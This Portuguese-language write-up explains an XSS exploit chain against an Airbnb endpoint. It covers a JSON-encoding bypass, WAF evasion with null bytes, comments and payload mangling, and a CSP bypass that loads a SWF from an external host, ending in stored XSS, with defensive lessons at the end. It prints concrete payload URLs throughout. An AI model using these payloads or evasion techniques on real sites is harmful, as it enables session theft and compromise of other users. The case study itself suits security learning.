# 🏠 AIRBNB – Bypass de JSON Encoding → XSS complexo

## 📌 Visão Geral

Este caso mostra como um **simples Reflected XSS** evoluiu para uma cadeia de múltiplos bypasses envolvendo:

* JSON encoding
* Parser HTML
* WAF
* CSP
* Auditor/XSS filters

Resultado: **até 8 vulnerabilidades combinadas**.

---

## 🚩 Ponto de Partida

* Endpoint recebia dados via URL
* Dados eram inseridos dentro de uma `<script>` no HTML
* Estrutura em **JSON**

💡 Cenário clássico:

```html
<script>
var data = {"input": "VALOR_CONTROLADO_PELO_USUARIO"};
</script>
```

👉 Isso normalmente leva a **Reflected XSS**

---

## ⚠️ Problema: JSON Encoding

O sistema fazia escaping de caracteres perigosos:

* `"`
* `>`
* `<`

🔒 Isso impedia:

* Fechar a tag `<script>`
* Injetar HTML/JS diretamente

---

## 💥 A BRECHA: `;` (ponto e vírgula)

O atacante descobriu que:

```js
;PAYLOAD
```

👉 Após o `;`, o filtro parava de sanitizar corretamente

💣 Resultado:

* Conseguiu inserir `</script>`
* Fechar o bloco JS

Exemplo simplificado:

```json
"</script><u>test123"
```

---

## 🧠 Conceito Importante: Parser HTML vs JS

### 🤯 Por que `"</script>"` funcionou mesmo dentro de string?

### 🔍 Funcionamento:

* O navegador entra em modo **JavaScript** dentro de `<script>`
* MAS o **parser HTML continua ativo em paralelo**

👉 Ele NÃO entende:

* JSON
* Variáveis
* Strings

👉 Ele só procura:

```html
</script>
```

💥 Quando encontra:

* Fecha a tag imediatamente
* O resto vira HTML normal

---

## 🧪 Tentativa inicial (bloqueada pelo WAF)

```url
?id=9978655&city-link-index=;</script><script>alert(1)</script>
```

🚫 Bloqueado pelo WAF

---

## 🧬 Bypass com Bytes Nulos + Comentários

Payload:

```url
;<sc%00ript>alert/**/(1)</script>
```

### 🔍 Técnicas usadas:

* `%00` → byte nulo
* `/**/` → comentário JS

### 💡 Resultado no JSON:

```json
"<sc\u0000ript>alert/**/(1)</script>"
```

### 🧠 Insight:

* Byte nulo → quebra detecção do WAF
* Comentário → mantém JS válido

🚧 Problema:

* Byte nulo também quebrava a tag `<script>`

---

## 🔧 Solução: Adicionando Atributos

Payload:

```html
;<sc%00ript/test='asdf'/te%00st2='asdf'>alert/**/(1)</script>
```

### 💡 Descoberta:

* Ao adicionar atributos:

  * O JSON **removia bytes nulos**
* Resultado:

  * Tag `<script>` válida novamente
  * WAF ainda bypassado

🔥 Agora ele conseguia:

* Fechar `<script>`
* Executar JS

---

## 🛡️ Próximo Obstáculo: CSP

### 🔍 Política encontrada:

```text
default-src 'self' https:;
object-src 'self' https:;
```

### 🚨 Problema grave:

👉 `https:` está liberado globalmente

Isso significa:

* QUALQUER domínio HTTPS é permitido

---

## 💣 Bypass do CSP

Ele usou:

```html
<embed src="//malicious-site/xss.swf">
```

### 💡 Por quê funciona?

* `object-src` permite:

  * `<embed>`
  * `<object>`

* E aceita:

  * qualquer `https://`

---

## 🚀 Payload final

```url
?city-link-index=;</script>
<embed src='//buer.haus/xss2.swf'>
```

✔ Executa código externo
✔ Bypass CSP
✔ Não usa `<script>` diretamente (evita WAF)

---

## 🧠 Impressão Digital do WAF

Problema:

* Payload só funcionava para:

  * IP do atacante
  * User-Agent específico

👉 WAF estava **marcando a URL**

---

## 🔥 Técnica: "Butchering the Payload"

Objetivo:

* Tornar o payload irreconhecível

### Estratégia:

* Inserir caracteres inúteis:

  * `+`
  * `%00`
  * `%09`
  * strings quebradas

💣 Exemplo:

```url
</script><em;<;>;<embed ... >
```

👉 Resultado:

* WAF não reconhece
* Browser reconstrói corretamente

---

## 🔄 Evolução: Reflected → Stored XSS

### 💡 Descoberta final:

* O mesmo sistema JSON era usado em outros pontos

👉 Ele conseguiu:

* Salvar o payload no banco
* Executar automaticamente para outros usuários

🚨 Resultado:

* **Stored XSS**

---

# 🧠 Resumo Final

## 🔗 Cadeia de exploração

1. Reflected XSS inicial
2. Bypass JSON encoding (`;`)
3. Exploração do parser HTML (`</script>`)
4. Bypass WAF:

   * bytes nulos
   * comentários
   * obfuscação
5. Manipulação de atributos
6. Bypass CSP (`https:` aberto)
7. Execução via `<embed>`
8. Evolução para Stored XSS

---

# 🎯 Lições Importantes

## 🔐 Para defesa:

* Nunca confiar só em JSON encoding
* CSP deve ser restritivo:

  ```text
  default-src 'self'
  ```
* WAF sozinho não resolve
* Evitar inserir dados diretamente em `<script>`

---



